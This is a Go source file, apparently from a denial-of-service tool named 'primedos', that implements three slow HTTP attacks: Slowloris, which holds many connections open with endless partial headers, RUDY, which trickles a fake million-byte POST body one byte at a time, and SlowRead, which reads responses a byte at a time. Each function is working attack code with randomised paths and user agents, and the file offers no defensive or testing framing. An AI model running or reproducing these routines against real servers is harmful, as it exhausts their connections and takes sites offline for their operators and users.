package vectors

import (
	"context"
	"fmt"
	"net"
	"time"

	"primedos/internal/core"
)

func Slowloris(ctx context.Context, w *core.Worker) error {
	const maxConns = 32
	conns := make([]net.Conn, 0, maxConns)
	defer func() {
		for _, c := range conns {
			c.Close()
		}
	}()
	t := time.NewTicker(1500 * time.Millisecond)
	defer t.Stop()

	for {
		if ctx.Err() != nil {
			return nil
		}
		for len(conns) < maxConns && ctx.Err() == nil {
			c, err := w.S.DialRaw(ctx)
			if err != nil {
				w.Error()
				break
			}
			hdr := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n",
				w.S.RandomPath(w.R), w.S.Tgt.HostHeader(), w.S.RandomUA(w.R))
			if _, err := c.Write([]byte(hdr)); err != nil {
				c.Close()
				break
			}
			w.Conn()
			w.Account(len(hdr)+core.WireOverhead(len(hdr)), len(hdr), 1, 0)
			conns = append(conns, c)
		}

		select {
		case <-ctx.Done():
			return nil
		case <-t.C:
		}

		live := conns[:0]
		for _, c := range conns {
			line := "X-" + randHex(w.R, 4) + ": " + randHex(w.R, 8) + "\r\n"
			_ = c.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := c.Write([]byte(line)); err != nil {
				c.Close()
				continue
			}
			w.Account(len(line)+core.WireOverhead(len(line)), len(line), 1, 0)
			live = append(live, c)
		}
		conns = live
	}
}

func Rudy(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		c, err := w.S.DialRaw(ctx)
		if err != nil {
			w.Error()
			continue
		}
		hdr := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\nConnection: keep-alive\r\n\r\n",
			w.S.RandomPath(w.R), w.S.Tgt.HostHeader(), w.S.RandomUA(w.R))
		if _, err := c.Write([]byte(hdr)); err != nil {
			c.Close()
			continue
		}
		w.Conn()
		w.Account(len(hdr)+core.WireOverhead(len(hdr)), len(hdr), 1, 0)

		deadline := time.Now().Add(3 * time.Minute)
		for ctx.Err() == nil && time.Now().Before(deadline) {
			select {
			case <-ctx.Done():
				c.Close()
				return nil
			case <-time.After(time.Duration(1500+w.R.Intn(1500)) * time.Millisecond):
			}
			if _, err := c.Write([]byte(randHex(w.R, 1))); err != nil {
				break
			}
			w.Account(1+core.WireOverhead(1), 1, 1, 0)
		}
		c.Close()
	}
	return nil
}

func SlowRead(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		c, err := w.S.DialRaw(ctx)
		if err != nil {
			w.Error()
			continue
		}
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n",
			w.S.RandomPath(w.R), w.S.Tgt.HostHeader(), w.S.RandomUA(w.R))
		if _, err := c.Write([]byte(req)); err != nil {
			c.Close()
			continue
		}
		w.Conn()
		w.Account(len(req)+core.WireOverhead(len(req)), len(req), 1, 1)

		buf := make([]byte, 1)
		deadline := time.Now().Add(2 * time.Minute)
		for ctx.Err() == nil && time.Now().Before(deadline) {
			_ = c.SetReadDeadline(time.Now().Add(10 * time.Second))
			if _, err := c.Read(buf); err != nil {
				break
			}
			w.Account(1+core.WireOverhead(1), 1, 1, 0)
			select {
			case <-ctx.Done():
				c.Close()
				return nil
			case <-time.After(time.Duration(2500+w.R.Intn(1500)) * time.Millisecond):
			}
		}
		c.Close()
	}
	return nil
}
